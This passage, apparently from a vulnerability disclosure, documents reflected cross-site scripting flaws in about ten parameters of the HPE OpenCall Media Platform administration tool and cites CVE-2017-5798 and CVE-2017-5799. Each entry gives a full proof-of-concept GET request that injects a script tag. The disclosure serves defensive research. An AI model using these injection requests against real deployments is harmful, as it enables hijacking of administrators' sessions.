+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_TYPE2 input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2522b2″><script>alert(1)<
+%2fscript>54f45&LEV_TYPE3=T3
+
+Proof of Concept
+An Attacker send the following GET request to the victims machine :
+
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2522b2"><script>alert(1)<%2fscript>54f45&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_TYPE3 parameter
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_TYPE3 input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3ecc32″><script>alert(1)<
+%2fscript>54a0f
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine :
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3ecc32"><script>alert(1)<%2fscript>54a0f
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_NAME0 parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_NAME0 input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0fa802″><script>alert(1)<
+%2fscript>671a8&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine :
+
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0fa802"><script>alert(1)<%2fscript>671a8&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_NAME1 parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_NAME1 input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1f530e”><script>alert(1)<
+%2fscript>d677f&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine :
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1f530e"><script>alert(1)<%2fscript>d677f&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_NAME2 parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_NAME2 input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N261a9f”><script>alert(1)<
+%2fscript>118f3&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N261a9f"><script>alert(1)<%2fscript>118f3&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_NAME3 parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_NAME3 input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N30c4b8″><script>alert(1)<
+%2fscript>c10b2&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N30c4b8"><script>alert(1)<%2fscript>c10b2&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – GetMapAction function
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function input. An attacker can inject malicious Java script to
+trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTMLaec5a”><script>alert(1)<
+%2fscript>70733&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTMLaec5a"><script>alert(1)<%2fscript>70733&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – LEV_NUM parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter LEV_NUM input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=00b96d”><script>alert(1)<
+%2fscript>58400&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root&DATE=0&LEV_NUM=00b96d"><script>alert(1)<%2fscript>58400&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – NAME parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize GetMapAction
+function parameter NAME input. An attacker can inject malicious Java
+script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root8c0d0″><script>alert(1)<
+%2fscript>b811a&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /OCMPOAM/BMPFFaultMgr.chailet?GetMapAction=HTML&LEVEL=TOP_LEVEL&TYPE=1&NAME=Root8c0d0"><script>alert(1)<%2fscript>b811a&DATE=0&LEV_NUM=0&LEV_NAME0=N0&LEV_NAME1=N1&LEV_NAME2=N2&LEV_NAME3=N3&LEV_TYPE0=T0&LEV_TYPE1=T1&LEV_TYPE2=T2&LEV_TYPE3=T3
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/BMPFFaultMgr.chailet
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – next parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize cdrdispatch
+function parameter next input. An attacker can inject malicious Java
+script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL: GET
+/OCMPOAM/cdrdispatch?sessionType=ACTIVE&cmd=ViewActiveCalls&next=DisplayBaseCdrBrowsePagea908f<script>alert(1)<
+%2fscript>2f6bfa40b3d&CallSessionList=ACTIVE
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /OCMPOAM/cdrdispatch?sessionType=ACTIVE&cmd=ViewActiveCalls&next=DisplayBaseCdrBrowsePagea908f<script>alert(1)<%2fscript>2f6bfa40b3d&CallSessionList=ACTIVE
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/cdrdispatch?cmd=DisplayBaseCdrBrowsePage&sessionType=NONE
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+Platform Administration Tool – next parameter
+
+HPE OpenCall Media Platform (OCMP) does not sanitize cdrdispatch
+function parameter sessionType input. An attacker can inject malicious
+Java script to trigger the Reflected Cross-Site Scripting (XSS).
+
+The vulnerable URL:
+/OCMPOAM/cdrdispatch?sessionType=25ed6″><script>alert(1)<
+%2fscript>1b604fa73f3&cmd=ViewActiveCalls&next=DisplayBaseCdrBrowsePage&CallSessionList=ACTIVE
+
+Proof of Concept
+
+An Attacker send the following GET request to the victims machine:
+
+GET /OCMPOAM/cdrdispatch?sessionType=25ed6"><script>alert(1)<%2fscript>1b604fa73f3&cmd=ViewActiveCalls&next=DisplayBaseCdrBrowsePage&CallSessionList=ACTIVE
+HTTP/1.1
+Host: 172.27.116.40:4443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0)
+Gecko/20100101 Firefox/40.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: https://172.27.116.40:4443/OCMPOAM/cdrdispatch?cmd=DisplayBaseCdrBrowsePage&sessionType=NONE
+Cookie: JSESSIONID=4F99C27525BFDB44D46E3A109FA49DAC
+Connection: keep-alive
+
+CVE’s
+
+CVE-2017-5799 – Remote Code Execution
+CVE-2017-5798 – Reflected Cross-Site Scripting (XSS)
